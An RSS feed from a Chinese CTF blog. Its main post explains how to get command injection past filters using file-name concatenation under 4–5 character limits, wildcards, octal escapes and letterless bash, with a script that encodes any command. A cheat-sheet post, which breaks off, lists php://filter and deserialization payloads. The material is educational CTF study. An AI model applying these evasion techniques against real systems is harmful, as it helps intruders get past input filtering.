<?xml version="1.0" encoding="utf-8"?>






<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Ajatar</title>
        <link>https://ajatars.github.io/</link>
        <description>Ajatar's blog</description>
        <generator>Hugo 0.67.0 https://gohugo.io/</generator>
        
            <language>zh-CN</language>
        
        
            <managingEditor>Ajatars@163.com (Ajatar)</managingEditor>
        
        
            <webMaster>Ajatars@163.com (Ajatar)</webMaster>
        
        
            <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
        
        <lastBuildDate>Wed, 18 Mar 2020 18:20:09 +0800</lastBuildDate>
        
            <atom:link rel="self" type="application/rss+xml" href="https://ajatars.github.io/rss.xml" />
        
        
            <item>
                <title>各种骚骚的命令执行</title>
                <link>https://ajatars.github.io/posts/%E5%90%84%E7%A7%8D%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
                <guid isPermaLink="true">https://ajatars.github.io/posts/%E5%90%84%E7%A7%8D%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</guid>
                <pubDate>Mon, 16 Mar 2020 14:42:58 +0800</pubDate>
                
                    <author>Ajatars@163.com (Ajatar)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description><![CDATA[<h1 id="1长度限制的命令执行">1.长度限制的命令执行</h1>
<h2 id="11-长度限制为5时">1.1 长度限制为5时</h2>
<p><strong>思路:</strong><br>
根据 &lsquo;&gt;&rsquo; 运算符创建文件，并利用文件名拼接成命令,再用sh命令运行<br>
下面直接放代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">bash</span><span class="p">:</span>
<span class="o">&gt;</span><span class="n">l</span>\\        <span class="c1">#创建 l文件</span>
<span class="o">&gt;</span><span class="n">s</span>\ \\      <span class="c1">#创建 s + 空格文件</span>
<span class="n">ls</span><span class="o">&gt;</span><span class="n">_</span>        <span class="c1">#ls空格 输入到 _ 文件中</span>
<span class="o">&gt;-</span><span class="n">t</span>\\       <span class="c1">#创建 -t 文件  (ls -t 以创建文件时间排序)</span>
<span class="o">&gt;</span>\<span class="o">&gt;</span><span class="n">y</span>        <span class="c1">#创建 &gt;y 文件</span>
<span class="n">ls</span><span class="o">&gt;&gt;</span><span class="n">_</span>       <span class="c1">#追加 -t &gt;y 到 _文件中</span>

<span class="c1">#注意: 直接ls添加不好控，因为ls 排序默认以 非字符，字母，数字来排序。</span>
</code></pre></td></tr></table>
</div>
</div><p>文件名后面添加 &lsquo;\&rsquo; 是为了换行拼接下一个文件名，''\\&rsquo; 为转义得到 &lsquo;'，    真实有命令执行时只需写一个 &lsquo;\&rsquo; ，shell命令行下需要 &lsquo;\\&rsquo;<br>
<img src="https://i.loli.net/2019/07/12/5d288073c464750346.jpg" alt="1.jpg"></p>
<p>查看一下创建的文件，没有创建 y <br>
<img src="https://i.loli.net/2019/07/12/5d288073af09715149.jpg" alt="2.jpg"><br>
利有<code>sh _</code>运行<br>
<img src="https://i.loli.net/2019/07/12/5d288073b06cd34099.jpg" alt="3.jpg"><br>
再查看一下创建的文件<br>
<img src="https://i.loli.net/2019/07/12/5d288073b0b0328434.jpg" alt="4.jpg"></p>
<p>接下来执行命令 (<code>curl www.baidu.com</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="n">com</span>
<span class="o">&gt;</span><span class="n">u</span><span class="o">.</span>\\
<span class="o">&gt;</span><span class="nb">id</span>\\
<span class="o">&gt;</span><span class="n">ba</span>\\
<span class="o">&gt;</span><span class="n">w</span><span class="o">.</span>\\
<span class="o">&gt;</span><span class="n">ww</span>\\
<span class="o">&gt;</span><span class="n">l</span>\ \\
<span class="o">&gt;</span><span class="n">r</span>\\
<span class="o">&gt;</span><span class="n">cu</span>\\
<span class="c1">#注意如果是ip 地址 划分文件名时小数点不能单独放于开头创建文件，也可以转换为整数ip</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d288584a886a43588.jpg" alt="5.jpg"></p>
<p><code>sh y</code>
<img src="https://i.loli.net/2019/07/12/5d288584de93423314.jpg" alt="6.jpg"></p>
<h2 id="12-长度限制为4时">1.2 长度限制为4时</h2>
<p><strong>思路:</strong><br>
也是创建文件 根据局限的排序规则利有<code>rev</code>命令反转字符串</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="nb">dir</span>       <span class="c1">#创建dir 文件</span>
<span class="o">&gt;</span><span class="n">sl</span>        <span class="c1">#创建sl 文件</span>
<span class="o">&gt;</span><span class="n">g</span>\<span class="o">&gt;</span>       <span class="c1">#创建g&gt; 文件</span>
<span class="o">&gt;</span><span class="n">ht</span><span class="o">-</span>       <span class="c1">#创建ht- 文件</span>
<span class="o">*&gt;</span><span class="n">v</span>        <span class="c1">#运行 dir命令 并输入到v</span>
<span class="o">&gt;</span><span class="n">rev</span>       <span class="c1">#创建rev文件</span>
<span class="o">*</span><span class="n">v</span><span class="o">&gt;</span><span class="n">x</span>       <span class="c1">#执行 rev命令 并输入到x</span>

</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d28882e148c226249.jpg" alt="1.jpg"><br>
dir和ls 也是根据默认排序规则进行<br>
这里 d g h s 正好符合默认排序规则<br>
<img src="https://i.loli.net/2019/07/12/5d28882dea9d849356.jpg" alt="2.jpg"><br>
<img src="https://i.loli.net/2019/07/12/5d28882e06ed145228.jpg" alt="3.jpg"></p>
<p><img src="https://i.loli.net/2019/07/12/5d28882e1fcef45401.jpg" alt="4.jpg"></p>
<p>执行命令(<code>curl www.baidu.com</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;</span><span class="n">com</span>
<span class="o">&gt;</span><span class="n">u</span><span class="o">.</span>\\
<span class="o">&gt;</span><span class="nb">id</span>\\
<span class="o">&gt;</span><span class="n">ba</span>\\
<span class="o">&gt;</span><span class="n">w</span><span class="o">.</span>\\
<span class="o">&gt;</span><span class="n">ww</span>\\
<span class="o">&gt;</span><span class="n">l</span>\ \\
<span class="o">&gt;</span><span class="n">r</span>\\
<span class="o">&gt;</span><span class="n">cu</span>\\
</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d288a20e93a978440.jpg" alt="5.jpg"></p>
<p>然后执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">sh x
sh g
</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d288a2126bec36096.jpg" alt="6.jpg"></p>
<h1 id="2-使用通配符">2. 使用通配符</h1>
<pre><code>/???/??? [TAB][TAB]
</code></pre><p><img src="https://i.loli.net/2019/07/12/5d288dccbdda420859.jpg" alt="1.jpg"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">/???/??? /??????

<span class="c1">#/dev/cat 长度为六的文件</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="3使用八进制命令执行">3.使用八进制命令执行</h1>
<p>154=oct(l),163=oct(s)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="s1">$&#39;\154\163&#39;</span>  <span class="c1">#ls</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d288f6d2b7f915490.jpg" alt="1.jpg">   <br>
通过{a,b}语法分割命令和参数</p>
<pre><code>{$'\154\163',$'\55\154\141'} # ls -a
</code></pre><p><img src="https://i.loli.net/2019/07/12/5d288f6d4038640961.jpg" alt="2.jpg"></p>
<h1 id="4-不用数字字母的命令执行">4. 不用数字字母的命令执行</h1>
<p>前提:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="si">${#}</span>   <span class="o">=</span>&gt; <span class="m">0</span>
<span class="si">${#</span><span class="p">#</span><span class="si">}</span>  <span class="o">=</span>&gt; <span class="m">1</span>
<span class="k">$((</span><span class="m">1</span>&lt;&lt;<span class="m">1</span><span class="k">))</span> <span class="o">=</span>&gt; <span class="m">2</span> 
<span class="k">$((</span><span class="m">2#</span>bbb<span class="k">))</span> <span class="o">=</span>&gt; 將 bbb 从二进制转换
<span class="si">${</span><span class="p">!#</span><span class="si">}</span> <span class="o">=</span>&gt;  当前script的名称 与<span class="si">${</span><span class="nv">0</span><span class="si">}</span> 相等效果等同于 <span class="nv">$BASH_ARGV</span>（/bin/bash）


注意: 运行<span class="si">${</span><span class="p">!#</span><span class="si">}</span>需要进入root权限，否则是一个rbash<span class="o">(</span>restricted bash<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="https://i.loli.net/2019/07/12/5d2894d5177bf85833.jpg" alt="1.jpg"><br>
接下来根据 第三点根据八进制的命令执行一步步来改</p>
<pre><code>$'\154\163' #ls
</code></pre><pre><code>#159 163
$((2#001))$((2#101))$((2#101))$((2#001))$((2#110))$((2#011))
</code></pre><p><img src="https://i.loli.net/2019/07/12/5d2894d50338e50952.jpg" alt="2.jpg"></p>
<pre><code>#$'\155\163' 注意里面的\转义用途
$\'\\$((2#001))$((2#101))$((2#101))\\$((2#001))$((2#110))$((2#011))\'
</code></pre><p><img src="https://i.loli.net/2019/07/12/5d289593adfc489328.jpg" alt="4.jpg"></p>
<pre><code>#传递到/bin/bash 并执行
${!#}&lt;&lt;&lt;$\'\\$((2#001))$((2#101))$((2#100))\\$((2#001))$((2#110))$((2#011))\'
</code></pre><p><img src="https://i.loli.net/2019/07/12/5d2894d4f04be36567.jpg" alt="3.jpg"></p>
<p>同八进制代码执行一样 要是带入参数 得使用{a,b}语法分割</p>
<p>注意有空格时 还要再套一层&rsquo;{}&rsquo; 才是最终传递到<code>${!#}</code>的命令<br>
否则:</p>
<p><img src="https://i.loli.net/2019/07/12/5d2897b87270767259.jpg" alt="5.jpg"></p>
<p>成功的命令执行 <code>curl www.baidu.com</code>
<img src="https://i.loli.net/2019/07/12/5d2897b883ec814112.jpg" alt="6.jpg"></p>
<p>借用hexman师傅的脚本</p>
<pre><code>#注意区分python版本
n = dict()
n[0] = '$#'
n[1] = '${##}'
n[2] = '$(({n1}&lt;&lt;{n1}))'.format(n1=n[1])
n[3] = '$(({n2}#{n1}{n1}))'.format(n2=n[2], n1=n[1])
n[4] = '$(({n1}&lt;&lt;{n2}))'.format(n2=n[2], n1=n[1])
n[5] = '$(({n2}#{n1}{n0}{n1}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[6] = '$(({n2}#{n1}{n1}{n0}))'.format(n2=n[2], n1=n[1], n0=n[0])
n[7] = '$(({n2}#{n1}{n1}{n1}))'.format(n2=n[2], n1=n[1])
usercommand=&quot;curl www.baidu.com&quot;.split()
#py3 oct is 0oxxx python2 oct is 0xxx for py2 here is y[1:]
commandoct=[[y[2:] for y in map(oct,map(ord,x))] for x in usercommand] 
print (commandoct)
usercmdarr=[]
for _ in commandoct:
    tmp=&quot;&quot;
    for s in _:
        tmp+=&quot;\\\\&quot;
        for i in s:
            tmp+=n[int(i)]
    usercmdarr.append(&quot;$\\'{bashencode}\\'&quot;.format(bashencode=tmp))
bashexec=&quot;${!#}&lt;&lt;&lt;{&quot;+&quot;,&quot;.join(usercmdarr)+&quot;}&quot;
print(bashexec)
#${!#}&lt;&lt;&lt;{$\'\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\',$\'\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))${##}\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\'}

</code></pre><h1 id="5参考链接">5.参考链接</h1>
<p><a href="https://www.hexlt.org/archives/116/?tdsourcetag=s_pcqq_aiomsg">https://www.hexlt.org/archives/116/?tdsourcetag=s_pcqq_aiomsg</a><br>
<a href="https://www.xuebuyuan.com/2181778.html">https://www.xuebuyuan.com/2181778.html</a><br>
<a href="https://www.cnblogs.com/flintlovesam/p/6677037.html">https://www.cnblogs.com/flintlovesam/p/6677037.html</a><br>
<a href="http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/">http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/</a></p>
]]></description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://ajatars.github.io/categories/ctf/">CTF</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://ajatars.github.io/tags/ctf/">CTF</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>CTF Crypto</title>
                <link>https://ajatars.github.io/posts/ctf-crypto/</link>
                <guid isPermaLink="true">https://ajatars.github.io/posts/ctf-crypto/</guid>
                <pubDate>Sun, 15 Mar 2020 14:47:25 +0800</pubDate>
                
                    <author>Ajatars@163.com (Ajatar)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description><![CDATA[]]></description>
                
                
                
                
                
                    
                        
                    
                        
                    
                
            </item>
        
            <item>
                <title>CTF Misc</title>
                <link>https://ajatars.github.io/posts/ctf-misc/</link>
                <guid isPermaLink="true">https://ajatars.github.io/posts/ctf-misc/</guid>
                <pubDate>Sun, 15 Mar 2020 14:44:13 +0800</pubDate>
                
                    <author>Ajatars@163.com (Ajatar)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description><![CDATA[]]></description>
                
                
                
                
                
                    
                        
                    
                        
                    
                
            </item>
        
            <item>
                <title>CTF Web 备忘录（续更）</title>
                <link>https://ajatars.github.io/posts/ctf-web/</link>
                <guid isPermaLink="true">https://ajatars.github.io/posts/ctf-web/</guid>
                <pubDate>Wed, 01 Jan 1969 14:42:58 +0800</pubDate>
                
                    <author>Ajatars@163.com (Ajatar)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description><![CDATA[<hr>
<p>​					CTF web的一些总结与备忘。</p>
<blockquote>
<ul>
<li><a href="#1php%E7%9B%B8%E5%85%B3">1.PHP相关</a>
<ul>
<li><a href="#11-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96">1.1 变量覆盖</a></li>
<li><a href="#12-%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D">1.2 变量命名</a></li>
<li><a href="#13-php%E4%BC%AA%E5%8D%8F%E8%AE%AE">1.3 php伪协议</a></li>
<li><a href="#14-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">1.4 php反序列化</a></li>
<li><a href="#15-%E7%AA%81%E7%A0%B4disable_functions">1.5 突破disable_functions</a></li>
<li><a href="#16-php%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0">1.6 php一些函数</a></li>
<li><a href="#17php%E4%B8%80%E5%8F%A5%E8%AF%9D">1.7 php一句话</a></li>
<li><a href="#18php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cgetshell">1.8 php代码执行getshell</a></li>
</ul>
</li>
<li><a href="#%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6">2.关键文件</a>
<ul>
<li><a href="#21-nginx">2.1 nginx</a></li>
<li><a href="#22-apache">2.2 apache</a></li>
<li><a href="#23-bash%E6%96%87%E4%BB%B6">2.3 bash文件</a></li>
<li><a href="#24-proc%E6%96%87%E4%BB%B6">2.4 proc文件</a></li>
<li><a href="#23-dev%E6%96%87%E4%BB%B6">2.3 dev文件</a></li>
</ul>
</li>
<li><a href="#3sql%E6%B3%A8%E5%85%A5">3.SQL注入</a>
<ul>
<li><a href="#31-mysql%E6%95%99%E7%A8%8B%E5%92%8C%E6%96%87%E6%A1%A3">3.1 MYSQL教程和文档</a></li>
<li><a href="#32-%E5%AE%9E%E7%94%A8%E5%A5%BD%E6%96%87">3.2 实用好文</a></li>
</ul>
</li>
<li><a href="#4ssrf">4.SSRF</a>
<ul>
<li><a href="#41-gopher%E7%9A%84%E4%BD%BF%E7%94%A8">4.1 gopher的使用</a></li>
<li><a href="#42-ip%E5%9C%B0%E5%9D%80%E7%BB%95%E8%BF%87%E4%B8%8E%E7%99%BD%E5%90%8D%E5%8D%95">4.2 IP地址绕过与白名单</a></li>
<li><a href="#43-unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87">4.3 unicode编码绕过</a></li>
</ul>
</li>
<li><a href="#5xxe">5.XXE</a>
<ul>
<li><a href="#51-%E5%B8%B8%E7%94%A8poc">5.1 常用poc</a></li>
<li><a href="#52-%E4%B8%80%E4%BA%9B%E5%8D%8F%E8%AE%AE">5.2 一些协议</a></li>
<li><a href="#53-oob%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">5.3 OOB读取文件</a></li>
<li><a href="#54-%E6%9C%AC%E5%9C%B0xxe">5.4 本地xxe</a></li>
</ul>
</li>
<li><a href="#6%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">6.文件上传</a>
<ul>
<li><a href="#61-fuzz%E6%80%9D%E8%B7%AF">6.1 fuzz思路</a></li>
<li><a href="#62-htaccess%E5%92%8Cuserini">6.2 htaccess和.user.ini</a></li>
<li><a href="#63-php%E5%86%99%E6%96%87%E4%BB%B6">6.3 php/.写文件</a></li>
</ul>
</li>
<li><a href="#7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">7.命令执行</a>
<ul>
<li><a href="#71-bash%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9Btrick">7.1 bash下的一些trick</a></li>
<li><a href="#72-%E5%B7%A7%E7%94%A8curl">7.2 巧用curl</a></li>
<li><a href="#73-php%E4%B8%8B%E7%9A%84system%E4%B8%8Eeval">7.3 php下的system与eval</a></li>
</ul>
</li>
<li><a href="#8python%E7%9B%B8%E5%85%B3">8.python相关</a>
<ul>
<li><a href="#81-ssti">8.1 ssti</a></li>
<li><a href="#82-pin%E7%A0%81">8.2 pin码</a></li>
</ul>
</li>
<li><a href="#9java%E7%9B%B8%E5%85%B3">9.java相关</a>
<ul>
<li><a href="#91-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">9.1 java反序列化</a></li>
<li><a href="#92-fastjson%E6%BC%8F%E6%B4%9E">9.2 fastjson漏洞</a></li>
</ul>
</li>
<li><a href="#10javascript%E7%9B%B8%E5%85%B3">10.javascript相关</a>
<ul>
<li><a href="#101-javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">10.1 javascript原型链污染</a></li>
<li><a href="#102-preventExtensions%E7%BB%95%E8%BF%87">10.2 preventExtensions绕过</a></li>
<li><a href="#103-loadsh%E5%BA%93%E6%B1%A1%E6%9F%93">10.3 loadsh库污染</a></li>
<li><a href="#104-jqueryextend()">10.4 JQuery-$.extend()</a></li>
<li><a href="#105-ejs%E5%92%8Cjade%E7%9A%84RCE">10.5 ejs和jade的RCE</a></li>
<li><a href="#106-express%E6%A1%86%E6%9E%B6">10.6 express框架</a></li>
</ul>
</li>
<li><a href="#11nodejs%E7%9B%B8%E5%85%B3">11.NodeJS相关</a>
<ul>
<li><a href="#111-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8express%E6%A1%86%E6%9E%B6">11.1 快速启动express框架</a></li>
<li><a href="#112-npm%E6%89%80%E6%9C%89%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E6%BC%8F%E6%B4%9E">11.2 npm所有第三方库漏洞</a></li>
<li><a href="#113-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95">11.3 基本语法</a></li>
<li><a href="#114-url_parse%E7%BB%95%E8%BF%87">11.4 url_parse绕过</a></li>
<li><a href="#115-%E6%9F%A5%E7%9C%8B%E4%BE%9D%E8%B5%96%E6%BC%8F%E6%B4%9E">11.5 查看依赖漏洞</a></li>
<li><a href="#116-RCE%E8%AF%AD%E5%8F%A5">11.6 RCE语句</a></li>
<li><a href="#117-nodemon-node%E7%9A%84debug%E6%A8%A1%E5%BC%8F">11.7 nodemon-node的debug模式</a></li>
</ul>
</li>
<li><a href="#12XSS">12.XSS</a></li>
<li><a href="#12%E5%85%B6%E4%BB%96">13.其他</a>
<ul>
<li><a href="#121-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81">13.1 http请求走私</a></li>
<li><a href="#122-jwt%E6%94%BB%E5%87%BB">13.2 jwt攻击</a></li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="1php相关">1.PHP相关</h2>
<h4 id="11-变量覆盖">1.1 变量覆盖</h4>
<p>变量覆盖通常点有: extract、$$、parse_str()。</p>
<p><strong>$$</strong> 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现。</p>
<p><strong>extract()</strong> 该函数使用数组键名作为变量名，通常结合全局变量: $_GET、$_POST、$_REQUEST。</p>
<p><strong>parse_str()</strong> 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
<hr>
<h4 id="12-变量命名">1.2 变量命名</h4>
<p>php命名变量可使用大括号包裹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;this is a&#39;</span><span class="p">;</span>
<span class="err">$</span><span class="p">{</span><span class="nx">b</span><span class="p">}</span> <span class="o">=</span> <span class="s1">&#39;this is b&#39;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><hr>
<h4 id="13-php伪协议">1.3 php伪协议</h4>
<p>php//访问各个输入/输出流（I / O流），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php:/ /input用于执行php代码。</p>
<p><strong>php://filter</strong>: 常用于读取文件(文件函数可控参数，xxe)、死亡绕过exit(),die()、phar metadate反序列化,当有正则过滤时，可尝试大小写绕过。</p>
<p>常用的有:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php">读取文件
php://filter/read=convert.base64-encode/resource=index.php
Php://filter/read=string.rot13/resource=index.php  

死亡绕过
php://filter/read=convert.base64-decode/resource=xxx.php  (内容满足base64解码规则)
php://filter/write=string.rot13/resource=xxx.php (内容满足rot13解密规则，<span class="cp">&lt;?</span><span class="nx">cuc</span> <span class="nx">cucvasb</span><span class="p">();</span><span class="cp">?&gt;</span> )
反序列化执行
php://filter/resource=phar://tmp/uploads/xxxx.jpg
</code></pre></td></tr></table>
</div>
</div><hr>
<h4 id="14-php反序列化">1.4 php反序列化</h4>
<p>php使用serialize这个过程被称为序列化，使用unserialize这个过程被称为反序列化，其主要作用是便于数据的存储。但是如果未对反序列化数据进行验证，就会导致反序列化任意php对象，造成安全问题。</p>
<p>除了unserialize，使用phar伪协议可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞，极大地扩展了PHP反序列化的攻击面</p>
<p><strong>PHP反序列化自动执行的魔术方法</strong></p>
<table>
<thead>
<tr>
<th>方法名</th>
<th align="left">调用条件</th>
</tr>
</thead>
<tbody>
<tr>
<td>__call</td>
<td align="left">调用不可访问或不存在的方法时被调用</td>
</tr>
<tr>
<td>__callStatic</td>
<td align="left">调用不可访问或不存在的静态方法时被调用</td>
</tr>
<tr>
<td>__clone</td>
<td align="left">进行对象clone时被调用，用来调整对象的克隆行为</td>
</tr>
<tr>
<td>__constuct</td>
<td align="left">构建对象的时被调用；</td>
</tr>
<tr>
<td>__debuginfo</td>
<td align="left">当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</td>
</tr>
<tr>
<td>__destruct</td>
<td align="left">明确销毁对象或脚本结束时被调用；</td>
</tr>
<tr>
<td>__get</td>
<td align="left">读取不可访问或不存在属性时被调用</td>
</tr>
<tr>
<td>__invoke</td>
<td align="left">当以函数方式调用对象时被调用</td>
</tr>
<tr>
<td>__isset</td>
<td align="left">对不可访问或不存在的属性调用isset()或empty()时被调用</td>
</tr>
<tr>
<td>__set</td>
<td align="left">当给不可访问或不存在属性赋值时被调用</td>
</tr>
<tr>
<td>__set_state</td>
<td align="left">当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</td>
</tr>
<tr>
<td>__sleep</td>
<td align="left">当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</td>
</tr>
<tr>
<td>__toString</td>
<td align="left">当一个类被转换成字符串时被调用</td>
</tr>
<tr>
<td>__unset</td>
<td align="left">对不可访问或不存在的属性进行unset时被调用</td>
</tr>
<tr>
<td>__wakeup</td>
<td align="left">当使用unserialize时被调用，可用于做些对象的初始化操作</td>
</tr>
</tbody>
</table>
<p><strong>反序列化起点:</strong></p>
<p>__wakeup unserialize函数后最先调用</p>
<p>__destruct 方法销毁后最后调用</p>
<p>__toSting 当一个对象被当做字符串使用就会被调用</p>
<p><strong>反向列化中间跳板:</strong></p>
<p>__toString</p>
